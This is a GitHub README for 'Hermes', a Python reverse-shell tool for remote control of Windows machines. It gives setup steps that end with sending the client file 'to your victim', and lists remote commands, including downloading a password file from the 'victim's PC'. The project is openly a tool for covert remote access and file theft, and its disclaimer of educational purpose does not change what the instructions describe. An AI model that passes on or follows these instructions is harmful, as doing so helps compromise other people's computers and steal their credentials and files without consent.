
<h1 align='center'>Reverse Shell 🧨</h1>

<p align='center'>
  <b>Star ⭐ if you want more</b><br>
<i>(READM.md Français <a href="https://github.com/DictateurMiro/Hermes/blob/main/README.md">ici</a>)</i>
</p>

<p align="center">
  <img src="https://img.shields.io/github/languages/top/DictateurMiro/Hermes?color=red&style=flat">
  <img src="https://img.shields.io/github/last-commit/DictateurMiro/Hermes?color=red&style=flat">
  <img src="https://img.shields.io/github/stars/DictateurMiro/Hermes?color=red&style=flat&label=Stars">
  <img src="https://img.shields.io/github/forks/DictateurMiro/Hermes?color=red&style=flat&label=Forks">
</p>

---

<h2 align='center'>
Contact :
</h2>

<p align='center'>
<a href="https://t.me/empereurmiro">Telegram</a> 
</p>

---

## 🌙 Features
```sh-session
✔ Automatic connection to the server
✔ Automatic install module for client
✔ Beautiful UI
✔ Download and Upload file
```
---

## ✨ How a Reverse Shell works (English version soon ...)
<img src="https://raw.githubusercontent.com/DictateurMiro/Hermes/main/images/fonctionnement%20reverse%20shell.png">

---

## 🎥 Video
<img src="https://raw.githubusercontent.com/DictateurMiro/Hermes/main/images/demo.gif">

---

## 🚀 Setup

```sh-session
> Download zip file (git clone https://github.com/DictateurMiro/Hermes.git)
> Open port 13037 on your vps
> Run server.py
> Send client.pyw (with the ip in the file) to your victim
> Enjoy!
```

---

## 🎉 Upcoming / enhancements

```sh-session
- Working with linux host
```

---

## 🎭 Useful command

```
- echo %cd% ||| Equivalent to 'pwd' on Unix to find out which folder you're in
- cd .. && mkdir reverse ||| '&&' Allows you to execute one command and then another, e.g. 'cd ..' allows you to go one folder back and then create a new folder.
- type file.txt ||| Equivalent to 'cat' on Unix to view the contents of a text file.
- echo "hello" >> hello.txt ||| Writes "hello" to a file called "hello.txt".
- tasklist ||| Displays all current proccesses with their name and PID 
- taskkill /F /PID [PID] ||| Used to exit a process via the PID

- upload [path] ||| Sends a file to the victim's PC (Example: upload C:\Users\Miro\Desktop\token.py)
- download [path] ||| Recovers a file from the victim's PC (Example: download C:\Users\Victime\Documents\motdepasse.txt)
```

---

## 📋 License

This project is licensed under the MIT License
```js
  ・Educational purpose only and all your consequences caused by you actions is your responsibility
  ・Selling this Free Tool is forbidden
  ・If you make a copy of this/or fork it, it must be open-source and have credits linking to this repo
```

---

## 💭 ChangeLog

```diff

v1.3.1 ⋮ 23/10/2023
+ Added (Useful command) in README.md to explain the commands and how to use them

v1.3 ⋮ 21/10/2023
+ Added 'download' command to download file from the client to the server download directory

v1.2 ⋮ 20/10/2023
+ Added 'upload' command to upload in the download directory of the client
- Remove 'keyboard' module on server because it's useless

v1.1 ⋮ 16/10/2023
+ Added a video to demonstrate
```

<p align="center">
  README inspired from xKiian
</p>
